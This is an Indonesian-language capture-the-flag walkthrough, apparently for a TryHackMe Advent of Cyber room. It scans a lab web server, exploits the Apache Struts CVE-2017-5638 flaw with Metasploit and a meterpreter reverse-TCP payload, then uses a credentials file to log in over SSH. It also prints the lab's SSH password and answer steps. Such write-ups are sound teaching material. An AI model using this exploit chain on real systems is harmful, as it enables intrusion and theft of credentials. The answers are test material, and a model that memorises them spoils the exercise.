start mesin untuk bisa mendapatkan IP mesin.

<br>Q1:Compromise the web server using Metasploit. What is flag1?
<br>Q2:Now you've ompormised the web server, get onto the main system. What is Santa's SSH password?
<br>Q3:Who is on line 148 of the naughty list?
<br>Q4:Who is on line 52 of the nice list?

ssh santa:rudolphrednosedreindeer
find / 2>/dev/null | grep -i "flag1"

<br>A1:
<br>pertama gunakan `nmap` untuk scanning port yang terbuka dengan `nmap <IP> -sV -A`,
sembari menunggu proses scanning, kita bisa sambil scanning vuln dengan `nikto` dengan cara
`nikto -url http://<IP>`. hasil dari nmap akan seperti berikut
```shell
...
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 3d:70:ad:ec:3d:bd:60:79:3d:08:55:aa:ae:2e:0b:2d (RSA)
|   256 06:ff:ee:df:16:2d:b1:f1:6c:fe:59:42:c9:94:be:d2 (ECDSA)
|_  256 d2:ae:5c:bc:57:30:9a:b3:b1:d5:38:12:79:10:c9:63 (ED25519)
80/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-title: Santa Naughty and Nice Tracker
|_Requested resource was showcase.action
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
...
```
sedangkan hasil nikto
```
...
+ /: Uncommon header 'nikto-added-cve-2017-5638' found, with contents: 42.
+ /: Site appears vulnerable to the 'strutshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
+ /index.action: Site appears vulnerable to the 'strutshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
+ /login.action: Site appears vulnerable to the 'strutshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
...
```
dari hasil scan nikto, dapat dilihat bahwa terdapat vuln dengan nama "strutshock". maka
kita bisa memulai metasploit console dengan `msfconsole`. setelah itu kita search vuln nya
```shell
msfconsole> search strut
```
selanjutnya pilih `exploit/multi/http/struts2_content_type_ognl`, karena pada waktu itu
menurut [write-up](https://samanthactf.medium.com/tryhackme-advent-of-cyber-day-10-metasploit-a-ho-ho-ho-251ac500528d)
ini, exploit tersebut merupakan yang paling terbaru. selanjutnya kita set beberapa hal
yang diperlukan, dengan melihatnya dengan command `options`.
beberapa hal yang perlu di set adalah
- `set RHOSTS <IP Target>`
- `set RPORT <PORT HTTP Target>`
- `set LHOSTS <IP tun0 kita>`
- `set TARGETURI <IP:PORT HTTP/showcase.action>`
- `set PAYLOAD linux/x86/meterpreter/reverse_tcp`
setelah semua itu di set, maka kita bisa `run` atau `exploit`.
setelahnya, akan terbuat session baru, lalu kita aktifkan shell dengan command `shell`.
selanjutnya kita dapat mencari flag dengan cara
```
find / 2>/dev/null | grep -i "flag1"
```
setelah itu kita lakukan `cat` pada flag.

<br>A2:
<br>setelah flag ditemukan, kita selanjutnya mencari password dari SSH milik Santa. kita dapat
cek di home dir dengan `ls /home/` dan akan ditemukan user santa. selanjutnya kita dapat
`ls /home/santa/`. setelah ketemu credentials, kita dapat melakukan `cat ssh-creds.txt`
agar dapat melihat isinya. kita keep isinya, dan kita gunakan untuk login ke ssh dengan cara
```
ssh santa@<IP target> -p 22
```
dan masukkan password yang didapat dari file `ssh-creds.txt` tadi.


<br>A3:
<br>setelah tersambung, kita dapat lakukan `ls`. untuk mencari value dari baris yang spesifik,
kita dapat gunakan `sed`, jadi
```
sed '148q;d' naughty_list.txt
```

<br>A4:
<br>kita dapat gunakan cara yang sama dengan cara
```
sed '52q;d' nice_list.txt
```
